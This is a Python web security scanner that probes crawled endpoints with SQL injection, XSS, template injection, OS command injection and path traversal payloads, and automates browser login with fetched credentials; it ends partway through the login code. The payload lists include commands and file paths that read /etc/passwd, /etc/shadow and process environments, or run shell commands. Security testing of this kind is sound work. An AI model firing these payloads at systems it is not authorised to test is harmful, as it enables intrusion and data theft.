#!/usr/bin/env python3
"""
endpoint_scanner.py - Standalone endpoint security scanner.

Reads a deep_crawl JSON inventory and runs automated injection tests against
every discovered endpoint, producing a findings JSON + self-contained HTML report.

Usage:
    python scripts/endpoint_scanner.py deep_crawl_bcd07806.json
    python scripts/endpoint_scanner.py deep_crawl_bcd07806.json --max-concurrent 3 --delay 1.0
    python scripts/endpoint_scanner.py deep_crawl_bcd07806.json --skip-auth --header "Authorization: Bearer xxx"
    python scripts/endpoint_scanner.py deep_crawl_bcd07806.json -o report
    python scripts/endpoint_scanner.py deep_crawl_bcd07806.json --injectors sql,xss,cmd
"""

import argparse
import asyncio
import html as html_mod
import json
import re
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import httpx
from playwright.async_api import async_playwright


# ─────────────────────────────── data types ───────────────────────────────────

@dataclass
class Finding:
    injector: str
    risk: str          # critical / high / medium / low
    confidence: str    # high / medium / low
    title: str
    payload: str
    injection_point: str   # path / query / body
    target_param: str
    evidence: str
    baseline_status: int
    test_status: int
    test_time_ms: float

@dataclass
class RouteResult:
    url: str
    resolved_url: str
    method: str
    sources: list
    baseline_status: int = 0
    baseline_time_ms: float = 0
    baseline_content_type: str = ""
    auth_required: bool | None = None
    tests_run: int = 0
    findings: list = field(default_factory=list)
    unreachable: bool = False


# ─────────────────────────── logging helper ───────────────────────────────────

def _p(msg: str, error: bool = False):
    prefix = "[!]" if error else "[*]"
    print(f"{prefix} {msg}", file=sys.stderr if error else sys.stderr, flush=True)


# ─────────────────────────── ID resolution ────────────────────────────────────

# Matches {id} placeholders in URLs
_PLACEHOLDER_RE = re.compile(r'\{id\}')

# Resource type from path segment before {id}
_RESOURCE_SEGMENT_RE = re.compile(r'/([a-z][a-z0-9_-]*)/\{id\}', re.IGNORECASE)

# Map plural path segments to singular resource types used in discovered_ids
_PLURAL_MAP = {
    "organisations": "organisation",
    "workspaces": "workspace",
    "schemas": "schema",
    "items": "item",
    "members": "member",
    "roles": "role",
    "dashboards": "dashboard",
    "widgets": "widget",
    "documents": "document",
    "folders": "folder",
    "templates": "template",
    "jobs": "job",
    "flows": "flow",
    "batches": "batch",
    "entities": "entity",
    "data-points": "data-point",
    "datapoints": "datapoint",
    "uploads": "upload",
}


def _singularize(segment: str) -> str:
    """Convert a plural path segment to a singular resource type."""
    low = segment.lower()
    if low in _PLURAL_MAP:
        return _PLURAL_MAP[low]
    # Strip trailing 's' as fallback
    if low.endswith("s") and len(low) > 2:
        return low[:-1]
    return low


def _find_ids_for_resource(rtype: str, segment: str, discovered_ids: dict) -> list[str]:
    """Find clean IDs for a resource type, trying multiple lookup strategies."""
    # Try exact match
    ids = discovered_ids.get(rtype, [])
    if not ids:
        # Try without hyphen: "data-point" → "datapoint"
        ids = discovered_ids.get(rtype.replace("-", ""), [])
    if not ids:
        # Try the plural form
        ids = discovered_ids.get(segment.lower(), [])

    # Filter out IDs that contain '/' (like "DataPoint/01KJ...") — those
    # are document references, not path IDs
    clean = [i for i in ids if "/" not in i]
    return clean


def resolve_url(url: str, discovered_ids: dict) -> str | None:
    """Replace {id} placeholders with real IDs from the crawl output.

    Returns the resolved URL or None if we can't fill all placeholders.
    Uses a multi-level fallback: resource-specific IDs → generic "id" pool →
    any available ID from the crawl data.
    """
    if "{id}" not in url:
        return url

    # Collect all available IDs as a flat fallback pool
    fallback_pool = []
    for rtype in ("id", "workspace", "item", "organisation", "schema",
                   "datapoint", "data-point", "role"):
        for val in discovered_ids.get(rtype, []):
            if "/" not in val and val not in fallback_pool:
                fallback_pool.append(val)

    # Find all resource segments before {id} placeholders
    segments = _RESOURCE_SEGMENT_RE.findall(url)
    if not segments:
        # No named segment before {id} — use fallback pool
        if fallback_pool:
            return _PLACEHOLDER_RE.sub(fallback_pool[0], url, count=1)
        return None

    result = url
    used_ids = set()  # track IDs we've already substituted to avoid reuse

    for segment in segments:
        rtype = _singularize(segment)
        clean_ids = _find_ids_for_resource(rtype, segment, discovered_ids)

        # Pick an ID we haven't used yet
        chosen = None
        for cid in clean_ids:
            if cid not in used_ids:
                chosen = cid
                break
        if chosen is None and clean_ids:
            chosen = clean_ids[0]  # reuse if we must

        # Fallback: use generic ID pool
        if chosen is None:
            for fid in fallback_pool:
                if fid not in used_ids:
                    chosen = fid
                    break
            if chosen is None and fallback_pool:
                chosen = fallback_pool[0]

        if chosen is None:
            return None

        used_ids.add(chosen)
        result = _PLACEHOLDER_RE.sub(chosen, result, count=1)

    # If there are still unresolved placeholders, fill from fallback pool
    while "{id}" in result:
        unused = [fid for fid in fallback_pool if fid not in used_ids]
        if unused:
            chosen = unused[0]
        elif fallback_pool:
            chosen = fallback_pool[0]
        else:
            return None
        used_ids.add(chosen)
        result = _PLACEHOLDER_RE.sub(chosen, result, count=1)

    return result


# ─────────────────────────── injector classes ─────────────────────────────────

class BaseInjector:
    name: str = ""
    display_name: str = ""

    def quick_payloads(self) -> list[str]:
        return []

    def full_payloads(self) -> list[str]:
        return self.quick_payloads()

    def analyze(self, baseline: dict, test_resp: dict, payload: str) -> dict | None:
        """Return a finding dict if vulnerable, else None."""
        return None

    def _risk_level(self, confidence: str) -> str:
        """Map confidence to risk. Subclasses can override."""
        return {"high": "high", "medium": "medium", "low": "low"}.get(confidence, "low")


class SQLInjector(BaseInjector):
    name = "sql"
    display_name = "SQL Injection"

    ERROR_PATTERNS = [
        r"you have an error in your sql syntax",
        r"warning.*mysql",
        r"unclosed quotation mark",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"pg_query",
        r"pg_exec",
        r"postgresql.*error",
        r"unterminated quoted string",
        r"syntax error at or near",
        r"sqlite3\.OperationalError",
        r"unrecognized token",
        r'near ".*": syntax error',
        r"microsoft.*odbc.*sql server",
        r"unclosed quotation mark after the character string",
        r"\[sql server\]",
        r"sql syntax.*error",
        r"sql error",
        r"ora-\d{5}",
        r"quoted string not properly terminated",
    ]

    def quick_payloads(self):
        return [
            "'",
            "' OR 1=1--",
            "' AND SLEEP(3)--",
        ]

    def full_payloads(self):
        return [
            "'", '"',
            "' OR '1'='1", '" OR "1"="1',
            "' OR 1=1--", '" OR 1=1--', "' OR 1=1#",
            "') OR ('1'='1", "') OR 1=1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' AND 1=1--", "' AND 1=2--",
            "' AND 'a'='a", "' AND 'a'='b",
            "' AND SLEEP(3)--",
            "'; WAITFOR DELAY '0:0:3'--",
            "' AND pg_sleep(3)--",
            "' || (SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END)--",
            "'; SELECT 1--", "'; SELECT pg_sleep(3)--",
            "1' ORDER BY 1--", "1' ORDER BY 10--",
            "-1' UNION SELECT 1--",
            "admin'--",
            "%27%20OR%201%3D1--", "%22%20OR%201%3D1--",
        ]

    def analyze(self, baseline, test_resp, payload):
        evidence = []
        is_vulnerable = False
        confidence = "low"

        body = test_resp.get("body", "").lower()
        baseline_body = baseline.get("body", "").lower()
        test_time = test_resp.get("response_time_ms", 0)
        baseline_time = baseline.get("response_time_ms", 0)
        test_status = test_resp.get("status_code", 0)
        baseline_status = baseline.get("status_code", 0)

        # 1. SQL error leak
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                if not re.search(pattern, baseline_body, re.IGNORECASE):
                    evidence.append(f"SQL error pattern: {pattern}")
                    is_vulnerable = True
                    confidence = "high"

        # 2. Time-blind
        if any(kw in payload.upper() for kw in ("SLEEP", "WAITFOR", "PG_SLEEP")):
            if test_time > baseline_time + 2500:
                evidence.append(f"Time-based: {test_time:.0f}ms vs baseline {baseline_time:.0f}ms")
                is_vulnerable = True
                confidence = "high"

        is_empty = body.strip().strip('"') in ("", "null", "{}", "[]")
        is_rejection = 400 <= test_status < 500

        # 3. Boolean-blind
        if "AND 1=2" in payload or "'a'='b" in payload:
            if not is_rejection and not is_empty and body != baseline_body:
                evidence.append("Boolean false returned non-empty different response")
                is_vulnerable = True
                confidence = "medium"

        if "AND 1=1" in payload or "'a'='a" in payload:
            if not is_rejection and body == baseline_body and test_status == baseline_status:
                evidence.append("Boolean true matches baseline -- SQL may be evaluated")
                is_vulnerable = True
                confidence = "medium"

        # 4. UNION
        if "UNION" in payload.upper():
            if not is_rejection and test_status == 200 and not is_empty:
                if len(body) > len(baseline_body) + 50:
                    evidence.append("UNION query returned additional content")
                    is_vulnerable = True
                    confidence = "medium"

        # 5. Server error
        if test_status == 500 and baseline_status != 500:
            evidence.append(f"500 error triggered (baseline was {baseline_status})")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "medium"

        if not is_vulnerable:
            return None
        return {
            "confidence": confidence,
            "risk": self._risk_level(confidence),
            "evidence": "; ".join(evidence),
        }


class XSSInjector(BaseInjector):
    name = "xss"
    display_name = "Cross-Site Scripting (XSS)"

    CANARY = "x5s7k9q"

    REFLECTION_PATTERNS = [
        r"<script[^>]*>.*?</script>",
        r"on\w+\s*=\s*[\"']",
        r"javascript\s*:",
        r"<img[^>]+onerror",
        r"<svg[^>]+onload",
        r"<iframe[^>]+src\s*=",
        r"<body[^>]+onload",
        r"expression\s*\(",
        r"url\s*\(\s*[\"']?javascript:",
    ]

    def quick_payloads(self):
        c = self.CANARY
        return [
            f"<script>{c}</script>",
            f'"><img src=x onerror=alert("{c}")>',
            f"' onfocus='alert(`{c}`)' autofocus='",
        ]

    def full_payloads(self):
        c = self.CANARY
        return [
            f"<script>{c}</script>",
            f"<script>alert('{c}')</script>",
            f"<ScRiPt>{c}</ScRiPt>",
            f'"><img src=x onerror=alert("{c}")>',
            f"'><img src=x onerror=alert('{c}')>",
            f'" onmouseover="alert(\'{c}\')" x="',
            f"' onfocus='alert(`{c}`)' autofocus='",
            f'"><svg onload=alert("{c}")>',
            f"'><svg/onload=alert('{c}')>",
            f'"><body onload=alert("{c}")>',
            f'" ><script>{c}</script>',
            f"' ><script>{c}</script>",
            f'`><script>{c}</script>',
            f"${{alert('{c}')}}",
            f"`${{alert('{c}')}}`",
            f'javascript:alert("{c}")',
            f"javascript:alert('{c}')",
            f'"><a href="javascript:alert(\'{c}\')">click</a>',
            f'"><iframe src="javascript:alert(\'{c}\')">',
            f'<svg><script>alert("{c}")</script></svg>',
            f"<svg/onload=alert('{c}')>",
            f'<svg><animate onbegin=alert("{c}") attributeName=x>',
            f"<img src=x onerror=alert(String.fromCharCode(120,53,115))>",
            f"%3Cscript%3Ealert('{c}')%3C/script%3E",
            f"&lt;script&gt;alert('{c}')&lt;/script&gt;",
            f'<script>alert`{c}`</script>',
            f'#"><img src=x onerror=alert("{c}")>',
            f"javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert({c})//'>",
            f"<scr<script>ipt>alert('{c}')</scr</script>ipt>",
            f"<img/src=x onerror=alert('{c}')>",
            f"<details open ontoggle=alert('{c}')>",
            f"<input type=text value='' onfocus=alert('{c}') autofocus>",
            f"<marquee onstart=alert('{c}')>",
        ]

    def analyze(self, baseline, test_resp, payload):
        evidence = []
        is_vulnerable = False
        confidence = "low"

        body = test_resp.get("body", "")
        baseline_body = baseline.get("body", "")
        test_status = test_resp.get("status_code", 0)

        canary_in_response = self.CANARY in body
        canary_in_baseline = self.CANARY in baseline_body

        if not canary_in_response:
            return None

        # Raw payload reflected unescaped
        if payload in body and payload not in baseline_body:
            evidence.append("Payload reflected unescaped in response body")
            is_vulnerable = True
            confidence = "high"

        # Dangerous patterns
        for pattern in self.REFLECTION_PATTERNS:
            matches_test = re.findall(pattern, body, re.IGNORECASE)
            matches_base = re.findall(pattern, baseline_body, re.IGNORECASE)
            if len(matches_test) > len(matches_base):
                evidence.append(f"Dangerous pattern appeared: {pattern}")
                is_vulnerable = True
                if confidence != "high":
                    confidence = "medium"

        # Script tag with canary survived
        if canary_in_response and not canary_in_baseline:
            if f"<script>{self.CANARY}</script>" in body.lower():
                evidence.append("Script tag with canary reflected without encoding")
                is_vulnerable = True
                confidence = "high"

            event_with_canary = re.search(
                rf'on\w+\s*=\s*["\']?[^"\']*{self.CANARY}', body, re.IGNORECASE
            )
            if event_with_canary:
                evidence.append("Event handler with canary reflected in attribute")
                is_vulnerable = True
                confidence = "high"

        # Content-Type check
        content_type = test_resp.get("headers", {}).get("content-type", "")
        if is_vulnerable and "json" in content_type:
            confidence = "low"
            evidence.append("Response is JSON -- reflected but unlikely exploitable")
        if is_vulnerable and "text/plain" in content_type:
            confidence = "low"
            evidence.append("Response is text/plain -- browser won't render HTML")

        if test_status == 403 and is_vulnerable:
            evidence.append("403 returned -- possible WAF blocking")
            confidence = "low"

        if not is_vulnerable:
            return None
        return {
            "confidence": confidence,
            "risk": self._risk_level(confidence),
            "evidence": "; ".join(evidence),
        }


class SSTIInjector(BaseInjector):
    name = "ssti"
    display_name = "Server-Side Template Injection (SSTI)"

    CANARY_PRODUCT = "9799447"

    ERROR_PATTERNS = [
        r"jinja2\.exceptions", r"UndefinedError", r"TemplateSyntaxError", r"jinja2",
        r"Twig_Error", r"Twig\\Error", r"twig\.error",
        r"freemarker\.core\.", r"freemarker\.template\.", r"FreeMarker template error",
        r"ParseException",
        r"mako\.exceptions", r"MakoException",
        r"SyntaxError.*erb", r"erb.*error",
        r"org\.apache\.velocity", r"VelocityException",
        r"com\.mitchellbosecke\.pebble", r"PebbleException",
        r"Smarty.*error", r"SmartyCompilerException",
        r"org\.thymeleaf", r"TemplateProcessingException",
        r"template.*syntax.*error", r"template.*not.*found", r"unexpected.*tag",
    ]

    def quick_payloads(self):
        return [
            "{{1337*7331}}",
            "${1337*7331}",
            "<%= 1337*7331 %>",
        ]

    def full_payloads(self):
        return [
            "{{1337*7331}}", "${1337*7331}", "<%= 1337*7331 %>",
            "#{1337*7331}", "{1337*7331}", "${{1337*7331}}", "{{=1337*7331}}",
            "{{'7'*7}}",
            "{{config}}", "{{self.__class__.__mro__}}",
            "{{_self.env.display('x')}}",
            "<#assign x=1337*7331>${x}",
            "${\"freemarker.template.utility.Execute\"?new()(\"echo EPT_SSTI\")}",
            "#set($x=1337*7331)$x",
            "#set($e=\"\")$e.class.forName(\"java.lang.Runtime\")",
            "{math equation=\"1337*7331\"}",
            "{php}echo 'EPT_SSTI';{/php}",
            "${1337*7331}",
            "<%import os%>${os.popen('echo EPT_SSTI').read()}",
            "{% set x = 1337*7331 %}{{ x }}",
            "{{invalid_var_xyz}}", "${invalid_var_xyz}", "<%= invalid_var_xyz %>",
            "{{''.__class__}}", "${T(java.lang.Runtime)}",
            "{{''|join}}",
            "{%25 set x=1337*7331 %25}{{x}}",
        ]

    def analyze(self, baseline, test_resp, payload):
        evidence = []
        is_vulnerable = False
        confidence = "low"

        body = test_resp.get("body", "")
        body_lower = body.lower()
        baseline_body = baseline.get("body", "")
        baseline_lower = baseline_body.lower()
        test_status = test_resp.get("status_code", 0)
        baseline_status = baseline.get("status_code", 0)

        # 1. Canary product
        if self.CANARY_PRODUCT in body and self.CANARY_PRODUCT not in baseline_body:
            evidence.append(f"Template expression evaluated: {self.CANARY_PRODUCT} found")
            is_vulnerable = True
            confidence = "high"

        # 2. String multiplication
        if "7777777" in body and "7777777" not in baseline_body:
            evidence.append("Jinja2 string multiplication: '7'*7 -> 7777777")
            is_vulnerable = True
            confidence = "high"

        # 3. Command execution marker
        if "EPT_SSTI" in body and "EPT_SSTI" not in baseline_body:
            evidence.append("Command execution via template injection: EPT_SSTI marker")
            is_vulnerable = True
            confidence = "high"

        # 4. Object reference leaked
        for pattern, desc in [
            (r"<class\s+'", "Python class reference leaked"),
            (r"__class__", "Python __class__ attribute accessible"),
            (r"__mro__", "Python MRO chain accessible"),
            (r"java\.lang\.", "Java class reference leaked"),
            (r"<Configuration", "Jinja2/Flask config object leaked"),
        ]:
            if re.search(pattern, body) and not re.search(pattern, baseline_body):
                evidence.append(desc)
                is_vulnerable = True
                confidence = "high"

        # 5. Template engine errors
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, body_lower, re.IGNORECASE):
                if not re.search(pattern, baseline_lower, re.IGNORECASE):
                    evidence.append(f"Template error pattern: {pattern}")
                    is_vulnerable = True
                    if confidence != "high":
                        confidence = "medium"

        # 6. Server error
        if test_status == 500 and baseline_status != 500:
            evidence.append(f"500 error triggered (baseline was {baseline_status})")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "low"

        if not is_vulnerable:
            return None
        return {
            "confidence": confidence,
            "risk": "critical" if confidence == "high" else self._risk_level(confidence),
            "evidence": "; ".join(evidence),
        }


class CmdInjector(BaseInjector):
    name = "cmd"
    display_name = "OS Command Injection"

    CANARY = "EPT_CMD_9f3a7c"

    OUTPUT_PATTERNS = [
        (r"uid=\d+\(", "Unix id command output"),
        (r"root:.*:0:0:", "/etc/passwd content leaked"),
        (r"Linux\s+\S+\s+\d+\.\d+", "Linux kernel version leaked"),
        (r"GNU/Linux", "GNU/Linux identifier leaked"),
        (r"total\s+\d+\s+drwx", "Directory listing (ls -la) leaked"),
        (r"Microsoft Windows \[Version", "Windows version string leaked"),
        (r"Volume Serial Number", "Windows dir output leaked"),
        (r"Directory of [A-Z]:\\", "Windows directory listing leaked"),
    ]

    ERROR_PATTERNS = [
        r"sh:\s+.*:\s+not found",
        r"sh:\s+.*:\s+command not found",
        r"bash:\s+.*:\s+command not found",
        r"/bin/sh:", r"/bin/bash:",
        r"'.*' is not recognized as an internal or external command",
        r"The system cannot find",
        r"not recognized as an internal",
        r"syntax error near unexpected token",
        r"unexpected EOF while looking for",
        r"No such file or directory",
        r"Permission denied",
    ]

    def quick_payloads(self):
        return [
            "; sleep 3",
            f"| echo {self.CANARY}",
            "& timeout /t 3 /nobreak",
        ]

    def full_payloads(self):
        c = self.CANARY
        return [
            "; sleep 3", "| sleep 3", "|| sleep 3", "& sleep 3", "&& sleep 3",
            "`sleep 3`", "$(sleep 3)",
            "& timeout /t 3 /nobreak", "| timeout /t 3 /nobreak",
            "&& ping -n 4 127.0.0.1",
            f"; echo {c}", f"| echo {c}", f"&& echo {c}",
            f"`echo {c}`", f"$(echo {c})",
            f"& echo {c}", f"| echo {c}",
            "; id", "| id", "$(id)", "; uname -a", "| cat /etc/passwd",
            f"'; sleep 3; '", f'"; sleep 3; "', f"'; echo {c}; '",
            "%0asleep 3", "%0d%0asleep 3",
            ";sl$(x)eep 3", "; {sleep,3}",
        ]

    def analyze(self, baseline, test_resp, payload):
        evidence = []
        is_vulnerable = False
        confidence = "low"

        body = test_resp.get("body", "")
        baseline_body = baseline.get("body", "")
        test_status = test_resp.get("status_code", 0)
        baseline_status = baseline.get("status_code", 0)
        test_time = test_resp.get("response_time_ms", 0)
        baseline_time = baseline.get("response_time_ms", 0)

        # 1. Canary detection
        if self.CANARY in body and self.CANARY not in baseline_body:
            evidence.append(f"Command output canary found: {self.CANARY}")
            is_vulnerable = True
            confidence = "high"

        # 2. Time-based
        if any(kw in payload.lower() for kw in ("sleep", "timeout", "ping -n")):
            if test_time > baseline_time + 2500:
                evidence.append(f"Time-based: {test_time:.0f}ms vs baseline {baseline_time:.0f}ms")
                is_vulnerable = True
                confidence = "high"

        # 3. Command output patterns
        for pattern, desc in self.OUTPUT_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                if not re.search(pattern, baseline_body, re.IGNORECASE):
                    evidence.append(desc)
                    is_vulnerable = True
                    confidence = "high"

        # 4. Shell error patterns
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                if not re.search(pattern, baseline_body, re.IGNORECASE):
                    evidence.append(f"Shell error pattern: {pattern}")
                    if not is_vulnerable:
                        is_vulnerable = True
                        confidence = "medium"

        # 5. Server error
        if test_status == 500 and baseline_status != 500:
            evidence.append(f"500 error triggered (baseline was {baseline_status})")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "low"

        if not is_vulnerable:
            return None
        return {
            "confidence": confidence,
            "risk": "critical" if confidence == "high" else self._risk_level(confidence),
            "evidence": "; ".join(evidence),
        }


class TraversalInjector(BaseInjector):
    name = "traversal"
    display_name = "Path Traversal"

    FILE_SIGNATURES = [
        (r"root:.*:0:0:", "/etc/passwd content"),
        (r"daemon:.*:\d+:\d+:", "/etc/passwd content"),
        (r"nobody:.*:\d+:\d+:", "/etc/passwd content"),
        (r"root:\$[0-9a-z]+\$", "/etc/shadow content (critical)"),
        (r"\[fonts\]", "win.ini [fonts] section"),
        (r"\[extensions\]", "win.ini [extensions] section"),
        (r"\[mci extensions\]", "win.ini content"),
        (r"\[drivers\]", "system.ini [drivers] section"),
        (r"PATH=.*:", "/proc/self/environ leaked"),
        (r"HOME=/", "/proc/self/environ leaked"),
        (r"\[boot loader\]", "boot.ini content"),
        (r"Index of /", "Directory listing exposed"),
    ]

    ERROR_PATTERNS = [
        r"FileNotFoundException", r"java\.io\.FileNotFoundException",
        r"No such file or directory", r"failed to open stream",
        r"include\(\.\./", r"require\(\.\./", r"fopen\(",
        r"open_basedir restriction", r"Permission denied", r"Access is denied",
        r"System\.IO\.", r"The system cannot find the (file|path)",
        r"Not a directory", r"Is a directory",
    ]

    def quick_payloads(self):
        return [
            "../../../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

    def full_payloads(self):
        return [
            "../../../etc/passwd", "../../../../etc/passwd",
            "../../../../../etc/passwd", "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd", "../../../../../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini", "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd", "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "../../../etc/passwd%00", "../../../etc/passwd%00.jpg",
            "/etc/passwd", "/etc/shadow", "/proc/self/environ", "/proc/self/cmdline",
            "C:\\windows\\win.ini", "C:\\windows\\system.ini",
            "....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
            "..;/..;/..;/etc/passwd",
            "..\\../..\\../etc/passwd",
            "../../../etc/hosts", "../../../proc/version",
        ]

    def analyze(self, baseline, test_resp, payload):
        evidence = []
        is_vulnerable = False
        confidence = "low"

        body = test_resp.get("body", "")
        baseline_body = baseline.get("body", "")
        test_status = test_resp.get("status_code", 0)
        baseline_status = baseline.get("status_code", 0)

        # 1. Known file content signatures
        for pattern, desc in self.FILE_SIGNATURES:
            if re.search(pattern, body, re.IGNORECASE | re.MULTILINE):
                if not re.search(pattern, baseline_body, re.IGNORECASE | re.MULTILINE):
                    evidence.append(f"File content detected: {desc}")
                    is_vulnerable = True
                    confidence = "high"

        # 2. Content-type changed
        test_ct = test_resp.get("headers", {}).get("content-type", "")
        baseline_ct = baseline.get("headers", {}).get("content-type", "")
        if test_ct and baseline_ct:
            if ("json" in baseline_ct or "html" in baseline_ct) and (
                "octet-stream" in test_ct or "text/plain" in test_ct
            ):
                evidence.append(f"Content-type changed: {baseline_ct} -> {test_ct}")
                if not is_vulnerable:
                    is_vulnerable = True
                    confidence = "medium"

        # 3. File error patterns
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                if not re.search(pattern, baseline_body, re.IGNORECASE):
                    evidence.append(f"File error pattern: {pattern}")
                    if not is_vulnerable:
                        is_vulnerable = True
                        confidence = "medium"

        # 4. Server error
        if test_status == 500 and baseline_status != 500:
            evidence.append(f"500 error triggered (baseline was {baseline_status})")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "low"

        if not is_vulnerable:
            return None
        return {
            "confidence": confidence,
            "risk": "critical" if "shadow" in (evidence[0] if evidence else "") else self._risk_level(confidence),
            "evidence": "; ".join(evidence),
        }


ALL_INJECTORS = {
    "sql": SQLInjector,
    "xss": XSSInjector,
    "ssti": SSTIInjector,
    "cmd": CmdInjector,
    "traversal": TraversalInjector,
}


# ─────────────────────────── authentication ───────────────────────────────────

async def authenticate_browser(start_url: str, backend_url: str) -> dict:
    """Launch headless browser, authenticate, extract cookies + bearer tokens."""
    _p("Authenticating via browser login...")

    # Try to get credentials from backend
    credentials = []
    try:
        async with httpx.AsyncClient(base_url=backend_url, timeout=10) as c:
            r = await c.get("/api/credentials")
            r.raise_for_status()
            credentials = r.json()
    except Exception as e:
        _p(f"  Could not fetch credentials from backend: {e}")

    cred = None
    for c in credentials:
        if c.get("username") and c.get("password"):
            cred = c
            break
    if not cred and credentials:
        cred = credentials[0]

    if not cred or not cred.get("username") or not cred.get("password"):
        _p("  No credentials available -- skipping browser auth", error=True)
        _p("  Use --skip-auth with --header to provide auth manually", error=True)
        return {}

    username = cred["username"]
    password = cred["password"]
    _p(f"  Authenticating as '{username}'")

    parsed = urlparse(start_url)
    target_domain = parsed.netloc
    allowed_domains = {target_domain}
    if not target_domain.startswith("api."):
        allowed_domains.add(f"api.{target_domain}")

    headers = {}
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True)
        context = await browser.new_context(
            ignore_https_errors=True,
            viewport={"width": 1280, "height": 720},
        )
        page = await context.new_page()

        try:
            await page.goto(start_url, wait_until="domcontentloaded", timeout=15000)
            await page.wait_for_timeout(1500)
        except Exception as e:
            _p(f"  Can't reach {start_url}: {e}", error=True)
            await browser.close()
            return {}

        # ── Walk through login flow (same as deep_crawl.py) ──

        # Step 1: find login entry point
        for attempt in range(5):
            if await page.query_selector('input[type="password"]:visible'):
                break
            if await page.query_selector(
                'input[type="email"]:visible, input[name="loginfmt"]:visible'
            ):
                break

            best_btn = None
            all_btns = await page.query_selector_all('a:visible, button:visible')
            for btn in all_btns:
                text = (await btn.inner_text()).strip().lower()
                href = (await btn.get_attribute("href") or "").lower()
                if "email" in text and any(w in text for w in
                        ("login", "log in", "sign in", "signin", "continue")):
                    best_btn = btn
                    break
                if not best_btn and any(w in text for w in
                        ("log in", "login", "sign in", "signin")):
                    best_btn = btn
                if not best_btn and any(w in href for w in
                        ("login", "signin", "auth")):
                    best_btn = btn

            if best_btn:
                btn_text = (await best_btn.inner_text()).strip()
                _p(f"  Clicking: '{btn_text}' (attempt {attempt + 1})...")
                await best_btn.click()
                try:
                    await page.wait_for_load_state("domcontentloaded", timeout=15000)
                except Exception:
                    pass
                await page.wait_for_timeout(2000)
            else:
                _p("  No login form or button found -- may already be authenticated")
                break

        # Step 2: email/username field
        email_input = await page.query_selector(
            'input[type="email"]:visible, input[name="loginfmt"]:visible, '
            'input[name="login"]:visible, input[name="email"]:visible, '
            'input[name="username"]:visible'
        )
        if email_input:
            _p("  Filling email/username...")
            await email_input.fill(username)
            await email_input.dispatch_event("input")
            await email_input.dispatch_event("change")
            await page.wait_for_timeout(1000)

            try:
                next_btn = await page.query_selector(
                    '#idSIButton9:visible, '
                    'input[type="submit"]:visible, button[type="submit"]:visible, '
                    'button:has-text("Next"):visible, button:has-text("Continue"):visible, '
                    'button:has-text("Sign in"):visible, button:has-text("Log in"):visible'
                )
                if next_btn:
                    for _ in range(10):
                        disabled = await next_btn.get_attribute("disabled")
                        if disabled is None:
                            break
                        await page.wait_for_timeout(500)
                    await next_btn.click(timeout=5000)
                else:
                    await email_input.press("Enter")
                await page.wait_for_timeout(3000)
            except Exception:
                try:
                    await email_input.press("Enter")
                    await page.wait_for_timeout(3000)
                except Exception:
                    pass

        # Step 3: password field
        pw_input = None
        for _ in range(8):
            pw_input = await page.query_selector(
                'input[type="password"]:visible, input[name="passwd"]:visible, '
                'input[name="password"]:visible'
            )
            if pw_input:
                break
            await page.wait_for_timeout(1000)

        if pw_input:
            _p("  Filling password...")
            if not email_input:
                user_field = await page.query_selector(
                    'input[type="text"]:visible, input[type="email"]:visible, '
                    'input[name*="user"]:visible, input[name*="email"]:visible'
                )
                if user_field:
                    await user_field.fill(username)

            await pw_input.fill(password)
            await pw_input.dispatch_event("input")
            await pw_input.dispatch_event("change")
            await page.wait_for_timeout(1000)

            try:
                submit = await page.query_selector(
                    '#idSIButton9:visible, '
                    'input[type="submit"]:visible, button[type="submit"]:visible, '
                    'button:has-text("Sign in"):visible, '
                    'button:has-text("Log in"):visible, '
                    'button:has-text("Submit"):visible'
                )
                if submit:
                    for _ in range(10):
                        disabled = await submit.get_attribute("disabled")
                        if disabled is None:
                            break
                        await page.wait_for_timeout(500)
                    await submit.click(timeout=5000)
                else:
                    await pw_input.press("Enter")
                await page.wait_for_timeout(3000)
            except Exception:
                try:
                    await pw_input.press("Enter")
                    await page.wait_for_timeout(3000)
                except Exception:
                    pass
        else:
            _p("  No password field appeared")

        # Step 4: consent / "stay signed in?" prompts
        for _ in range(5):
            try:
                consent = await page.query_selector(
                    '#idSIButton9:visible, #idBtn_Back:visible, '
                    'button:has-text("Yes"):visible, button:has-text("Accept"):visible, '
                    'button:has-text("Continue"):visible, input[type="submit"]:visible'
                )
                if consent and any(d in page.url for d in (
                    "microsoftonline", "google", "okta", "auth0"
                )):
                    _p("  Handling SSO prompt...")
                    await consent.click(timeout=5000)
                    await page.wait_for_timeout(2000)
                else:
                    break
            except Exception:
                break

        # Step 5: wait for redirect
        _p("  Waiting for redirect back to target...")
        for i in range(20):
            current = urlparse(page.url).netloc
            if current in allowed_domains or target_domain in current:
                break
            if i == 19:
                _p(f"  Timed out waiting for redirect (stuck on {page.url})")
            await page.wait_for_timeout(1000)

        _p(f"  Login complete -- now at: {page.url}")

        # Extract auth headers
